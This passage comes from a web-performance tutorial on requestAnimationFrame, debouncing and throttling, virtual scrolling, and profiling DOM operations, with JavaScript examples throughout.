function animate(currentTime) {
  const deltaTime = currentTime - lastTime;
  lastTime = currentTime;
  
  console.log(`Frame took ${deltaTime}ms`);
  requestAnimationFrame(animate);
}
requestAnimationFrame(animate);
```

The browser automatically batches all `requestAnimationFrame` callbacks scheduled for the same frame, executing them sequentially before layout and paint. This batching ensures multiple animations can synchronize without triggering layout thrashing.

### Cancellation and Lifecycle Management

`requestAnimationFrame` returns a unique non-zero integer identifier that enables cancellation via `cancelAnimationFrame(id)`. This becomes critical for component unmounting, conditional animations, or cleanup operations.

```javascript
let animationId;

function startAnimation() {
  function loop(time) {
    // animation logic
    animationId = requestAnimationFrame(loop);
  }
  animationId = requestAnimationFrame(loop);
}

function stopAnimation() {
  if (animationId) {
    cancelAnimationFrame(animationId);
    animationId = null;
  }
}
```

Multiple calls to `requestAnimationFrame` before the next frame all receive the same timestamp parameter, ensuring temporal consistency across animation logic. Canceling an already-executed or non-existent ID has no effect and throws no errors.

### Frame Budget and Performance Optimization

Each frame has approximately 16.67ms at 60fps to complete all JavaScript execution, style calculation, layout, paint, and composite operations. `requestAnimationFrame` callbacks should target 10-12ms execution time maximum, leaving headroom for browser operations.

#### Measuring Frame Performance

```javascript
function animate(time) {
  const frameStart = performance.now();
  
  // Your animation work
  updatePositions();
  renderScene();
  
  const frameDuration = performance.now() - frameStart;
  
  if (frameDuration > 16) {
    console.warn(`Long frame: ${frameDuration.toFixed(2)}ms`);
  }
  
  requestAnimationFrame(animate);
}
```

Heavy computational work should be deferred using techniques like time-slicing, where work is distributed across multiple frames:

```javascript
function processLargeDataset(data, callback) {
  let index = 0;
  const chunkSize = 100;
  
  function processChunk(time) {
    const chunkEnd = Math.min(index + chunkSize, data.length);
    
    while (index < chunkEnd) {
      // Process data[index]
      index++;
    }
    
    if (index < data.length) {
      requestAnimationFrame(processChunk);
    } else {
      callback();
    }
  }
  
  requestAnimationFrame(processChunk);
}
```

### Throttling and Tab Visibility

Browsers aggressively throttle `requestAnimationFrame` in background tabs, often reducing execution to 1-2fps or pausing entirely. The Page Visibility API provides explicit control:

```javascript
let isAnimating = false;
let animationId;

function animate(time) {
  // animation logic
  if (isAnimating) {
    animationId = requestAnimationFrame(animate);
  }
}

document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    isAnimating = false;
    if (animationId) {
      cancelAnimationFrame(animationId);
    }
  } else {
    isAnimating = true;
    requestAnimationFrame(animate);
  }
});
```

This prevents unnecessary CPU usage and battery drain when animations aren't visible. Some browsers also throttle based on device battery state or thermal conditions.

### Delta Time and Frame-Rate Independence

Using the timestamp parameter to calculate delta time ensures animations run at consistent speeds regardless of frame rate variations:

```javascript
const velocity = 100; // pixels per second
let position = 0;
let lastTime = null;

function animate(currentTime) {
  if (lastTime !== null) {
    const deltaTime = (currentTime - lastTime) / 1000; // convert to seconds
    position += velocity * deltaTime;
  }
  lastTime = currentTime;
  
  element.style.transform = `translateX(${position}px)`;
  requestAnimationFrame(animate);
}
```

Without delta time, animations would run faster on high-refresh displays and slower when frames are dropped. This approach maintains consistent animation speeds across varying performance conditions.

### Recursive vs. Continuous Scheduling

The standard pattern involves recursive scheduling where each callback schedules the next:

```javascript
function loop(time) {
  // work
  requestAnimationFrame(loop);
}
requestAnimationFrame(loop);
```

However, scheduling can be conditional based on animation state:

```javascript
class Animation {
  constructor() {
    this.isRunning = false;
    this.animationId = null;
  }
  
  start() {
    if (!this.isRunning) {
      this.isRunning = true;
      this.loop(performance.now());
    }
  }
  
  loop(time) {
    // animation work
    
    if (this.isRunning) {
      this.animationId = requestAnimationFrame(t => this.loop(t));
    }
  }
  
  stop() {
    this.isRunning = false;
    if (this.animationId) {
      cancelAnimationFrame(this.animationId);
    }
  }
}
```

### Interaction with Layout and Paint

`requestAnimationFrame` callbacks execute after the previous frame's composite but before style recalculation and layout for the current frame. This timing means:

- Reading layout properties (offsetWidth, getBoundingClientRect) triggers immediate layout if styles changed
- Writing DOM or CSSOM properties doesn't immediately trigger layout
- The actual paint occurs after all rAF callbacks complete

#### Avoiding Layout Thrashing

```javascript
// BAD: Causes layout thrashing
function animateBad() {
  elements.forEach(el => {
    const width = el.offsetWidth; // Read (forces layout)
    el.style.width = width + 10 + 'px'; // Write
  });
  requestAnimationFrame(animateBad);
}

// GOOD: Batch reads and writes
function animateGood() {
  // Batch all reads first
  const widths = elements.map(el => el.offsetWidth);
  
  // Then batch all writes
  elements.forEach((el, i) => {
    el.style.width = widths[i] + 10 + 'px';
  });
  
  requestAnimationFrame(animateGood);
}
```

For complex scenarios, libraries like FastDOM provide automatic read/write batching.

### Canvas and WebGL Rendering

For canvas-based animations, `requestAnimationFrame` coordinates with the canvas's rendering context:

```javascript
const canvas = document.querySelector('canvas');
const ctx = canvas.getContext('2d');

function draw(time) {
  // Clear canvas
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  
  // Drawing operations
  ctx.fillStyle = `hsl(${time * 0.1 % 360}, 70%, 50%)`;
  ctx.fillRect(50, 50, 100, 100);
  
  requestAnimationFrame(draw);
}
requestAnimationFrame(draw);
```

WebGL rendering follows similar patterns but benefits more significantly from rAF's synchronization with vsync, eliminating tearing:

```javascript
function render(time) {
  gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
  
  // Update uniforms
  gl.uniform1f(timeUniformLocation, time * 0.001);
  
  // Draw calls
  gl.drawArrays(gl.TRIANGLES, 0, vertexCount);
  
  requestAnimationFrame(render);
}
```

### Timestamp Precision and Timing Attacks

The DOMHighResTimeStamp provides microsecond precision on most platforms, but browsers may reduce precision to mitigate timing attacks (Spectre variants). Firefox and Safari round timestamps to 100μs or 1ms in certain contexts.

This affects timing-sensitive applications:

```javascript
function measurePrecision() {
  const samples = [];
  let count = 0;
  
  function collect(time) {
    samples.push(time);
    if (++count < 100) {
      requestAnimationFrame(collect);
    } else {
      const deltas = samples.slice(1).map((t, i) => t - samples[i]);
      const minDelta = Math.min(...deltas.filter(d => d > 0));
      console.log(`Timestamp precision: ${minDelta}ms`);
    }
  }
  
  requestAnimationFrame(collect);
}
```

Applications requiring precise timing measurements should account for this variability or use performance marks for higher-precision profiling.

### Comparison with setTimeout and setInterval

`setTimeout` and `setInterval` operate independently of the rendering pipeline and provide no vsync synchronization:

```javascript
// Non-synchronized, can cause tearing
setInterval(() => {
  element.style.left = position++ + 'px';
}, 16); // Approximately 60fps, but not aligned with frames

// Synchronized with rendering
function animate() {
  element.style.left = position++ + 'px';
  requestAnimationFrame(animate);
}
```

Key differences:

- **Timing drift**: `setInterval` accumulates drift; rAF stays synchronized with display refresh
- **Background throttling**: `setInterval` may run at full speed in background tabs; rAF throttles appropriately
- **Rendering coordination**: rAF callbacks batch with browser paint cycles; timers do not
- **Energy efficiency**: rAF pauses when invisible; timers continue consuming resources

`setTimeout` remains appropriate for non-visual timing needs or delays that shouldn't sync with frames.

### Multiple Animation Systems

When coordinating multiple independent animations, consider whether they should share a single rAF loop or maintain separate loops:

```javascript
// Shared loop - better performance
const animations = new Set();

function masterLoop(time) {
  animations.forEach(anim => anim.update(time));
  requestAnimationFrame(masterLoop);
}

function registerAnimation(animationFunc) {
  animations.add(animationFunc);
  if (animations.size === 1) {
    requestAnimationFrame(masterLoop);
  }
}

function unregisterAnimation(animationFunc) {
  animations.delete(animationFunc);
}
```

Separate loops make sense for animations with different lifecycles or performance requirements but increase overhead from multiple rAF callbacks per frame.

### Integration with CSS Animations and Transitions

JavaScript animations via rAF can coexist with CSS animations but require coordination to avoid conflicts:

```javascript
// Wait for CSS transition to complete
element.style.transition = 'transform 0.3s';
element.style.transform = 'translateX(100px)';

element.addEventListener('transitionend', () => {
  // Now safe to start JS animation
  function animate(time) {
    // JS animation logic
    requestAnimationFrame(animate);
  }
  requestAnimationFrame(animate);
}, { once: true });
```

Reading computed styles during CSS animations can provide current values:

```javascript
function animate() {
  const currentTransform = getComputedStyle(element).transform;
  // Use current transform matrix for calculations
  
  requestAnimationFrame(animate);
}
```

For optimal performance, prefer CSS animations for simple property transitions and reserve rAF for complex, stateful, or game-like animations requiring per-frame logic.

### Polyfills and Fallbacks

Legacy support requires polyfilling with setTimeout:

```javascript
window.requestAnimationFrame = window.requestAnimationFrame ||
  window.mozRequestAnimationFrame ||
  window.webkitRequestAnimationFrame ||
  function(callback) {
    return window.setTimeout(callback, 1000 / 60);
  };

window.cancelAnimationFrame = window.cancelAnimationFrame ||
  window.mozCancelAnimationFrame ||
  window.webkitCancelAnimationFrame ||
  function(id) {
    clearTimeout(id);
  };
```

This loses vsync benefits but maintains functional compatibility. Modern development typically requires rAF support as a baseline.

### Advanced Patterns: Animation Managers

Production applications benefit from centralized animation management:

```javascript
class AnimationManager {
  constructor() {
    this.animations = new Map();
    this.isRunning = false;
    this.rafId = null;
  }
  
  add(id, callback, priority = 0) {
    this.animations.set(id, { callback, priority });
    if (!this.isRunning) {
      this.start();
    }
  }
  
  remove(id) {
    this.animations.delete(id);
    if (this.animations.size === 0) {
      this.stop();
    }
  }
  
  start() {
    this.isRunning = true;
    this.loop(performance.now());
  }
  
  loop(time) {
    // Sort by priority
    const sorted = Array.from(this.animations.entries())
      .sort((a, b) => b[1].priority - a[1].priority);
    
    for (const [id, { callback }] of sorted) {
      try {
        callback(time);
      } catch (error) {
        console.error(`Animation ${id} error:`, error);
      }
    }
    
    if (this.isRunning) {
      this.rafId = requestAnimationFrame(t => this.loop(t));
    }
  }
  
  stop() {
    this.isRunning = false;
    if (this.rafId) {
      cancelAnimationFrame(this.rafId);
      this.rafId = null;
    }
  }
}

const manager = new AnimationManager();
manager.add('player', (time) => updatePlayer(time), 10);
manager.add('enemies', (time) => updateEnemies(time), 5);
```

This pattern provides error isolation, priority-based execution, and centralized lifecycle control while maintaining a single rAF callback per frame.

---

## Debouncing and Throttling

### Core Mechanisms

**Debouncing** delays function execution until after a specified time period has elapsed since the last invocation attempt. Each new call resets the timer. The function executes only when the event stream stops for the designated duration.

**Throttling** limits function execution to once per specified time interval. Once executed, subsequent calls are ignored until the interval expires, regardless of how many times the event fires.

### Implementation Patterns

#### Debounce Implementation

```javascript
function debounce(func, delay) {
  let timeoutId;
  
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}
```

The closure preserves the timeout ID across invocations. Each call clears the previous timer before setting a new one. The `apply` method preserves the correct `this` context and passes through all arguments.

#### Throttle Implementation

```javascript
function throttle(func, interval) {
  let lastCall = 0;
  
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= interval) {
      lastCall = now;
      func.apply(this, args);
    }
  };
}
```

This timestamp-based approach tracks the last execution time. The function only executes when sufficient time has elapsed since the previous call.

#### Alternative Throttle with Leading/Trailing Options

```javascript
function throttle(func, interval, options = {}) {
  let timeoutId;
  let lastCall = 0;
  const { leading = true, trailing = true } = options;
  
  return function(...args) {
    const now = Date.now();
    const timeSinceLastCall = now - lastCall;
    
    if (!lastCall && !leading) {
      lastCall = now;
    }
    
    if (timeSinceLastCall >= interval) {
      if (timeoutId) {
        clearTimeout(timeoutId);
        timeoutId = null;
      }
      lastCall = now;
      func.apply(this, args);
    } else if (!timeoutId && trailing) {
      timeoutId = setTimeout(() => {
        lastCall = leading ? Date.now() : 0;
        timeoutId = null;
        func.apply(this, args);
      }, interval - timeSinceLastCall);
    }
  };
}
```

### Execution Timing Characteristics

#### Debounce Timing

- **Delay initiation**: Timer starts on first event
- **Delay reset**: Each subsequent event resets the timer completely
- **Execution point**: Only after silence period completes
- **Rapid events**: Zero executions until events stop

For a 300ms debounce with events at 0ms, 100ms, 200ms, 250ms, then stopping:

- Timer resets at each event
- Execution occurs at 550ms (250ms + 300ms delay)
- Total executions: 1

#### Throttle Timing

- **First call**: Executes immediately (with leading edge)
- **Subsequent calls**: Blocked until interval expires
- **Execution frequency**: Maximum of once per interval
- **Continuous events**: Regular executions at interval boundaries

For 300ms throttle with continuous events every 50ms:

- Executions at 0ms, 300ms, 600ms, 900ms...
- Events between executions are discarded
- Maintains consistent execution rate

### Use Case Selection

#### When to Use Debouncing

**Search input autocomplete**: Wait for user to finish typing before querying API. Prevents excessive requests while user is actively typing.

**Window resize handlers**: Execute layout recalculations only after resizing completes. Avoids expensive DOM operations during the resize drag.

**Form validation**: Validate input after user pauses typing. Provides feedback without interrupting typing flow.

**Text editor autosave**: Save content after user stops editing. Prevents saving on every keystroke.

#### When to Use Throttling

**Scroll event handlers**: Process scroll position at regular intervals. Maintains responsiveness while limiting computation frequency.

**Mouse move tracking**: Sample mouse position periodically. Prevents overwhelming event processing for high-frequency mouse events.

**API rate limiting**: Ensure requests don't exceed service quotas. Enforces maximum request frequency.

**Game loop updates**: Maintain consistent frame rate. Executes game logic at fixed intervals regardless of event frequency.

**Progress indicators**: Update UI at human-perceivable intervals. Prevents excessive repaints while maintaining smooth appearance.

### Edge Cases and Considerations

#### Context Preservation

Both patterns must preserve function context (`this`) and arguments. Using arrow functions in the implementation would break method binding:

```javascript
// Incorrect - loses this context
const debounced = debounce(() => this.method(), 300);

// Correct - preserves this context
const debounced = debounce(function() { this.method(); }, 300);
```

#### Memory Leaks

Debounced/throttled functions hold references to timers and closures. For frequently created instances (like in React components), cleanup is essential:

```javascript
const debouncedFn = debounce(handler, 300);

// Later, when component unmounts or function is no longer needed
if (debouncedFn.cancel) {
  debouncedFn.cancel();
}
```

#### Leading vs Trailing Edge

**Leading edge execution**: Function runs immediately on first call, then blocks subsequent calls.

**Trailing edge execution**: Function runs after the quiet period (debounce) or at interval end (throttle).

Some implementations support both simultaneously, executing once at the start and once at the end of the event burst.

#### Immediate Invocation Option

Debounce variants may include an `immediate` parameter:

```javascript
function debounce(func, delay, immediate = false) {
  let timeoutId;
  
  return function(...args) {
    const callNow = immediate && !timeoutId;
    
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      timeoutId = null;
      if (!immediate) {
        func.apply(this, args);
      }
    }, delay);
    
    if (callNow) {
      func.apply(this, args);
    }
  };
}
```

This executes immediately on the leading edge, then enforces the delay before allowing another execution.

### Performance Impact

#### Computational Overhead

Both techniques add minimal overhead:

- Timer management: O(1) operations
- Closure creation: One-time cost per wrapped function
- Memory: Single timeout ID and timestamp storage

The performance benefit comes from reducing expensive operations (DOM manipulation, API calls, complex calculations) rather than the wrapper itself.

#### Event Queue Implications

Debouncing and throttling don't remove events from the browser's event queue. They only control when the handler executes. The original events still fire and occupy the event loop briefly before being discarded.

For extremely high-frequency events (thousands per second), consider passive event listeners or `requestAnimationFrame` instead of or in addition to throttling.

### Library Implementations

#### Lodash

```javascript
import { debounce, throttle } from 'lodash';

const debouncedFn = debounce(handler, 300, {
  leading: false,
  trailing: true,
  maxWait: 1000
});

const throttledFn = throttle(handler, 300, {
  leading: true,
  trailing: true
});

// Both provide cancel method
debouncedFn.cancel();
throttledFn.cancel();
```

Lodash's `debounce` includes a `maxWait` option, which combines debouncing with throttling—the function must execute if the maximum wait time is reached, even if events keep arriving.

#### RxJS

```javascript
import { fromEvent } from 'rxjs';
import { debounceTime, throttleTime } from 'rxjs/operators';

fromEvent(input, 'input')
  .pipe(debounceTime(300))
  .subscribe(handler);

fromEvent(window, 'scroll')
  .pipe(throttleTime(300, { leading: true, trailing: true }))
  .subscribe(handler);
```

RxJS treats debouncing and throttling as stream operators, integrating them into the reactive programming paradigm.

### RequestAnimationFrame Alternative

For visual updates synchronized with browser repaints, `requestAnimationFrame` provides superior timing:

```javascript
function rafThrottle(func) {
  let rafId = null;
  
  return function(...args) {
    if (rafId === null) {
      rafId = requestAnimationFrame(() => {
        func.apply(this, args);
        rafId = null;
      });
    }
  };
}
```

This executes at most once per frame (typically 60fps), aligning with the browser's rendering cycle. It's optimal for scroll handlers, animations, and visual updates.

### Testing Considerations

Testing debounced and throttled functions requires time manipulation:

```javascript
// Using Jest fake timers
jest.useFakeTimers();

const mockFn = jest.fn();
const debounced = debounce(mockFn, 300);

debounced();
debounced();
debounced();

jest.advanceTimersByTime(299);
expect(mockFn).not.toHaveBeenCalled();

jest.advanceTimersByTime(1);
expect(mockFn).toHaveBeenCalledTimes(1);
```

Real-time testing is unreliable due to JavaScript's single-threaded nature and timer resolution limitations.

### Common Pitfalls

**Creating new instances on each render**: In React, debounced functions created during render lose their timing state:

```javascript
// Wrong - creates new debounced function each render
function Component() {
  const handler = debounce(handleInput, 300);
  return <input onChange={handler} />;
}

// Correct - preserves debounced function across renders
function Component() {
  const handler = useMemo(() => debounce(handleInput, 300), []);
  return <input onChange={handler} />;
}
```

**Forgetting to cancel**: Unmounted components or removed event listeners should cancel pending executions to prevent updates on unmounted components.

**Incorrect delay values**:

- Too short (< 100ms): May not provide meaningful performance benefit
- Too long (> 1000ms): Creates noticeable lag in user experience
- Optimal range typically 150-500ms depending on use case

---

## Virtual Scrolling

Virtual scrolling is a rendering optimization technique that displays only the subset of items currently visible in the viewport, rather than rendering all items in a large list or collection. The DOM contains only enough elements to fill the visible area plus a buffer, while maintaining the illusion of a complete scrollable list through dynamic element recycling and positioning.

### Core Mechanism

The fundamental operation involves calculating which items should be visible based on scroll position, rendering only those items, and using absolute or relative positioning with padding/transforms to create correct scroll behavior. As the user scrolls, items leaving the viewport are recycled—their DOM nodes are reused and repopulated with data for items entering the viewport.

The container maintains two key measurements: the total scrollable height (calculated as `itemCount × itemHeight`) and the current scroll offset. These values determine which slice of data to render at any moment.

### Scroll Position Calculation

The visible range is derived from the scroll position. For fixed-height items:

```
startIndex = Math.floor(scrollTop / itemHeight)
endIndex = Math.ceil((scrollTop + viewportHeight) / itemHeight)
visibleItems = items.slice(startIndex, endIndex + buffer)
```

The buffer extends the rendered range beyond the visible viewport to provide smoother scrolling and prevent blank spaces during rapid scroll events.

### DOM Structure Patterns

**Container-based approach**: An outer scrollable container with defined height and `overflow: auto` or `overflow: scroll`. Inside, a tall spacer element establishes the total scroll height, and absolutely positioned item elements render at calculated offsets.

**Transform-based approach**: Items are positioned using CSS transforms (`translateY`) rather than absolute positioning. This can leverage GPU acceleration and avoid layout thrashing in some scenarios.

**Padding-based approach**: Top and bottom padding on the container simulates the space occupied by non-rendered items, with rendered items flowing naturally in document order.

### Item Height Strategies

**Fixed height**: All items have identical heights. This simplifies calculations significantly—item positions are deterministic (`itemTop = index × itemHeight`). This is the most performant approach but least flexible.

**Dynamic height with measurement**: Items have variable heights that must be measured after rendering. The virtualizer maintains a cache of measured heights and updates calculations as new measurements arrive. This requires a measurement phase where items are rendered offscreen or initially, their heights recorded, and subsequent renders use cached values.

**Estimated height with correction**: Start with estimated heights, render items, measure actual heights, then adjust positions. This creates a more complex system where scroll positions may shift as estimates are replaced with actual measurements. The challenge is maintaining scroll stability—preventing the viewport from jumping as heights are corrected.

### Position Management

Items must be positioned to appear at their correct location in the virtual list. Common techniques:

**Absolute positioning**: Each item receives `position: absolute` with calculated `top` values. The container has `position: relative`. This removes items from document flow, requiring explicit height management.

**Transform positioning**: Items use `transform: translateY(offset)` or `translate3d(0, offset, 0)`. The latter can trigger hardware acceleration. Items remain in flow for some layout purposes while being visually repositioned.

**Spacer elements**: Invisible elements before and after the visible range create the necessary scroll space without positioning each item absolutely.

### Scroll Synchronization

The virtualizer must respond to scroll events to update the rendered range. Key considerations:

**Event throttling/debouncing**: Raw scroll events fire rapidly. Throttling limits update frequency to avoid excessive recalculation and rendering. However, aggressive throttling can cause visible lag.

**RequestAnimationFrame synchronization**: Scheduling updates with `requestAnimationFrame` aligns rendering with the browser's repaint cycle, providing smooth updates without tearing.

**Passive event listeners**: Using `{passive: true}` on scroll listeners prevents blocking the scroll thread, improving scroll smoothness at the cost of not being able to prevent default behavior.

### Recycling and Pooling

Element recycling reuses DOM nodes rather than destroying and recreating them. When an item scrolls out of view, its DOM node is retained and repopulated with data for an item entering the viewport.

**Pool management**: Maintain a pool of DOM elements slightly larger than the visible range. As items shift, elements are pulled from the pool, updated, and repositioned rather than created fresh.

**State cleanup**: When recycling, all previous state must be cleared—event listeners updated, content replaced, attributes reset. Failing to clean state causes visual artifacts where old content briefly appears before updates.

**Key/identity tracking**: Each DOM node must track which data item it currently represents to ensure correct updates during recycling.

### Overscan and Buffer Zones

The overscan region extends rendered items beyond the visible viewport. Benefits:

**Scroll smoothness**: Items are pre-rendered before entering view, eliminating flashing or blank spaces during fast scrolling.

**Reduced update frequency**: Larger buffers mean fewer updates as the user scrolls, trading memory for fewer recalculations.

Common implementations render `overscanCount` additional items above and below the visible range. The overscan size is a tuning parameter—larger values improve perceived performance but increase DOM size and memory usage.

### Variable Height Challenges

Dynamic heights introduce measurement dependencies and calculation complexity:

**Initial estimation**: Before measurement, heights must be estimated. Poor estimates cause scroll position instability—the scrollbar jumps as estimates are replaced with actuals.

**Measurement timing**: Heights can only be measured after rendering. This creates a chicken-and-egg problem: you need heights to calculate positions, but need to render to get heights.

**Progressive measurement**: Measure items as they're first rendered, caching results. Initial scrolling may be unstable until all items are measured at least once. Some implementations pre-render items offscreen during idle time to gather measurements.

**Scroll anchor preservation**: When heights change, maintain the user's visual scroll position. If an item above the viewport becomes taller, the scroll position must increase correspondingly to keep the visible content stable.

### Bidirectional Scrolling

Supporting horizontal scrolling or grid layouts adds a second dimension of complexity:

**2D range calculation**: Calculate visible ranges for both axes. For grids: `visibleColumns`, `visibleRows`, and render the cartesian product.

**Cell positioning**: Each cell requires both X and Y positioning. Fixed-size grids simplify this (`x = column × cellWidth`, `y = row × cellHeight`), but variable sizes require 2D measurement caching.

**Overscan in both directions**: Buffer zones extend in four directions, potentially rendering significantly more items than the pure visible range.

### Scroll Restoration

When returning to a virtualized list (e.g., browser back navigation), maintaining scroll position requires:

**Position serialization**: Store scroll offset or the index/offset of the first visible item.

**Measurement availability**: If items have dynamic heights, their measurements must be available before scroll restoration, otherwise the calculated position will be wrong.

**Deferred restoration**: In some cases, wait until initial render and measurement complete before restoring scroll position, or restore to an approximate position that's corrected as measurements arrive.

### Performance Considerations

**Layout thrashing**: Interleaving reads (measuring heights) and writes (setting positions) causes forced synchronous layouts. Batch all measurements, then apply all position updates.

**Reflow triggers**: Changing `top`, `left`, or dimensions on positioned elements can trigger reflows. Transforms generally perform better as they're compositor-only operations in many cases.

**Memory vs. render cost**: Larger buffers increase memory usage and initial render time but reduce update frequency. The optimal balance depends on item complexity and scroll behavior patterns.

**Event listener management**: Attaching listeners to many recycled elements can create memory leaks if not properly cleaned. Use event delegation where possible, attaching listeners to the container rather than individual items.

### Edge Cases and Boundary Conditions

**Empty lists**: Handle zero-item cases without errors—render empty state, avoid division by zero in calculations.

**Single item**: When only one item exists, scrolling logic may behave unexpectedly if it assumes multiple items.

**Viewport larger than content**: If total content height is less than viewport height, scrolling shouldn't occur. Ensure calculations handle this gracefully.

**Rapid scroll to end**: When users rapidly scroll to the bottom (or use "jump to end"), the virtualizer must quickly calculate and render the final range without iterating through all intermediate positions.

**Fractional pixels**: Scroll positions and item heights may be fractional. Rounding inconsistencies can accumulate, causing misalignment. Use consistent rounding strategies throughout calculations.

### Interaction with Browser APIs

**IntersectionObserver**: Can detect when items enter/leave viewport, providing an alternative to scroll event listeners. May have better performance characteristics but requires different architecture—observers per item or range rather than centralized scroll handling.

**ResizeObserver**: Detects when container or items change size, triggering recalculation. Essential for responsive layouts where viewport dimensions change.

**Scrollbar behavior**: Virtual scrolling must maintain realistic scrollbar thumb size and position. The scrollbar represents the entire list, not just rendered items. This requires setting an explicit scroll height on the container or spacer element.

### Sticky Elements

Supporting sticky headers or footers within virtualized lists requires special handling:

**Position tracking**: Sticky elements must remain rendered even when their natural position scrolls out of view. Track which elements should be sticky and their stick points.

**Z-index management**: Sticky elements need higher stacking order to appear above scrolling content.

**Multiple sticky items**: When multiple headers stack (e.g., nested groups), manage the stack order and positioning as items enter/exit sticky states.

### Focus and Accessibility

Virtual scrolling creates accessibility challenges:

**Screen reader navigation**: Screen readers may not see non-rendered items. Implementing proper ARIA attributes (`aria-rowcount`, `aria-rowindex`) helps communicate the full list size.

**Keyboard navigation**: When a focused item scrolls out and is removed from DOM, focus is lost. Trap and restore focus as items recycle, or maintain focus on a container element.

**Tab order**: Only rendered items are in tab order. Users can't tab to non-rendered items, which may be unexpected behavior.

### Scroll Anchoring

CSS scroll anchoring can interfere with virtual scrolling. When content above the viewport changes (items are added, heights adjust), the browser may automatically adjust scroll position to keep content stable. This can conflict with the virtualizer's position management.

Setting `overflow-anchor: none` on the scroll container typically disables this behavior, giving the virtualizer full control over positioning.

### Data Updates and Reactivity

When underlying data changes:

**Item addition/removal**: Recalculate total height and visible range. If items are added above the viewport, adjust scroll position to maintain visual stability.

**Item updates**: If an update changes item height, remeasure and recalculate positions for subsequent items. This can cascade—updating one item affects all items below it.

**Batch updates**: Grouping multiple data changes into a single update cycle prevents redundant recalculations and renders.

### Implementation Patterns

**Render prop**: Virtualizer handles calculations and provides render information (`visibleItems`, `itemStyle`) to a render function that returns the actual item JSX/HTML.

**Wrapper component**: Virtualizer wraps the list, intercepting scroll events and injecting positioning props into item components.

**Hook-based**: Custom hooks (like `useVirtualizer`) expose virtualization state and utilities, leaving rendering to the consumer.

### Window Scrolling vs. Container Scrolling

**Window as scroll container**: The entire page scrolls, with the list taking up page space. Scroll events come from `window`, and item positions are relative to page top.

**Dedicated container**: A fixed-height element with overflow scrolling. More common in application UIs where the list is one component among many. Positions are relative to container top.

Window scrolling eliminates the need for a fixed-height container but complicates position calculations when other page content affects the list's offset.

---

## DOM Operation Profiling

### Performance Measurement APIs

#### Performance.mark() and Performance.measure()

The User Timing API provides precise performance measurements for DOM operations through marking and measuring intervals.

```javascript
// Mark the start of an operation
performance.mark('dom-start');

// Perform DOM operations
const container = document.getElementById('container');
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  container.appendChild(div);
}

// Mark the end
performance.mark('dom-end');

// Measure the duration
performance.measure('dom-operation', 'dom-start', 'dom-end');

// Retrieve the measurement
const measures = performance.getEntriesByName('dom-operation');
console.log(`Operation took: ${measures[0].duration}ms`);

// Clean up
performance.clearMarks();
performance.clearMeasures();
```

**High-Resolution Timestamps:**

`performance.now()` provides microsecond precision (limited by browser security policies) compared to `Date.now()`'s millisecond granularity:

```javascript
const start = performance.now();
document.body.appendChild(document.createElement('div'));
const end = performance.now();
console.log(`Precise duration: ${end - start}ms`);
```

#### Performance Observer

For continuous monitoring without polling, Performance Observer provides an event-driven approach:

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'measure') {
      console.log(`${entry.name}: ${entry.duration}ms`);
    }
  }
});

observer.observe({ entryTypes: ['measure', 'mark'] });

// Operations are automatically captured
performance.mark('operation-start');
// ... DOM operations ...
performance.mark('operation-end');
performance.measure('operation', 'operation-start', 'operation-end');
```

### Browser DevTools Profiling

#### Chrome DevTools Performance Panel

**Recording Profiles:**

1. Open DevTools → Performance tab
2. Click record (or Ctrl+E)
3. Perform DOM operations
4. Stop recording

**Key Metrics in Timeline:**

- **Scripting** (yellow) - JavaScript execution time including DOM API calls
- **Rendering** (purple) - Style calculations and layout operations
- **Painting** (green) - Pixel rendering to screen
- **System** (gray) - Browser overhead

**Analyzing DOM Operations:**

```javascript
// Example operation to profile
function heavyDOMOperation() {
  const fragment = document.createDocumentFragment();
  
  for (let i = 0; i < 10000; i++) {
    const div = document.createElement('div');
    div.className = 'item';
    div.textContent = `Item ${i}`;
    fragment.appendChild(div);
  }
  
  document.body.appendChild(fragment);
}

// Call with profiling enabled
console.profile('Heavy DOM Operation');
heavyDOMOperation();
console.profileEnd('Heavy DOM Operation');
```

The flame chart visualization shows:

- Function call hierarchy
- Time spent in each function
- DOM API bottlenecks
- Forced synchronous layouts (layout thrashing)

#### Firefox DevTools Performance Tool

Firefox provides similar capabilities with additional markers for:

- Reflow/Layout events
- Style recalculation triggers
- Composite layer creation

```javascript
// Firefox-specific console timing API
console.time('DOM Operation');
// ... operations ...
console.timeEnd('DOM Operation');

// More detailed with timestamps
console.timeLog('DOM Operation', 'Checkpoint 1');
// ... more operations ...
console.timeLog('DOM Operation', 'Checkpoint 2');
console.timeEnd('DOM Operation');
```

### Identifying Layout Thrashing

Layout thrashing occurs when scripts repeatedly read layout properties and write DOM changes, forcing synchronous reflow calculations.

#### Detection Pattern

```javascript
// BAD: Causes layout thrashing
function thrashingExample() {
  const elements = document.querySelectorAll('.item');
  
  elements.forEach(el => {
    // Read (triggers layout)
    const height = el.offsetHeight;
    
    // Write (invalidates layout)
    el.style.height = (height + 10) + 'px';
    
    // Next read forces synchronous layout recalculation
  });
}

// GOOD: Batch reads and writes
function optimizedExample() {
  const elements = document.querySelectorAll('.item');
  
  // Read phase
  const heights = Array.from(elements).map(el => el.offsetHeight);
  
  // Write phase
  elements.forEach((el, i) => {
    el.style.height = (heights[i] + 10) + 'px';
  });
}
```

#### Properties That Trigger Layout

Reading these properties forces layout calculation:

- Offset properties: `offsetTop`, `offsetLeft`, `offsetWidth`, `offsetHeight`, `offsetParent`
- Client properties: `clientTop`, `clientLeft`, `clientWidth`, `clientHeight`
- Scroll properties: `scrollTop`, `scrollLeft`, `scrollWidth`, `scrollHeight`
- Computed styles: `getComputedStyle()`, `getBoundingClientRect()`
- Layout methods: `scrollIntoView()`, `scrollTo()`, `focus()`

**Profiling Layout Events:**

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    // [Inference] Different browsers may expose layout timing differently
    if (entry.entryType === 'measure') {
      console.log(`Layout measure: ${entry.duration}ms`);
    }
  }
});

// Monitor layout-related operations
performance.mark('layout-start');

const height = document.body.offsetHeight; // Triggers layout

performance.mark('layout-end');
performance.measure('layout-read', 'layout-start', 'layout-end');
```

